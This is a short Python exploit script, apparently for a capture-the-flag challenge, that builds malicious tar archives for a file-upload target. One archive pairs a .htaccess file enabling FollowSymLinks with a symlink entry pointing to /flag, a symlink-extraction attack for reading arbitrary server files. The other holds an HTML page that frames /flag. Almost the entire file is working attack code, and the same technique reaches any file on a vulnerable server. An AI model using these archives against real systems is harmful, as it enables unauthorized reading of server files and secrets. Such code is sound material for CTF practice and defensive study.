#!/usr/bin/env python3
"""Create a tar with .htaccess to enable symlink following, plus a symlink."""
import tarfile
import io

def create_htaccess_tar():
    """Create tar with .htaccess that enables FollowSymLinks."""
    htaccess_content = b"""Options +FollowSymLinks
<IfModule mod_rewrite.c>
    RewriteEngine Off
</IfModule>
"""
    
    with tarfile.open("htaccess_symlink.tar", "w") as tar:
        # Add .htaccess
        ti_htaccess = tarfile.TarInfo(".htaccess")
        ti_htaccess.size = len(htaccess_content)
        tar.addfile(ti_htaccess, io.BytesIO(htaccess_content))
        
        # Add symlink to flag
        ti_flag = tarfile.TarInfo("flag")
        ti_flag.type = tarfile.SYMTYPE
        ti_flag.linkname = "/flag"
        tar.addfile(ti_flag)
        
    print("Created htaccess_symlink.tar")

def create_file_read_tar():
    """Create tar with a text file that might get processed by the server."""
    # Try creating an index.html with iframe to /flag
    html_content = b'<iframe src="/flag"></iframe><iframe src="/flag.txt"></iframe>'
    
    with tarfile.open("iframe_attempt.tar", "w") as tar:
        ti = tarfile.TarInfo("index.html")
        ti.size = len(html_content)
        tar.addfile(ti, io.BytesIO(html_content))
    
    print("Created iframe_attempt.tar")

if __name__ == "__main__":
    import os
    os.chdir(r"C:\Users\Alexandru Moga\Documents\first-gooogot-game\explo")
    create_htaccess_tar()
    create_file_read_tar()
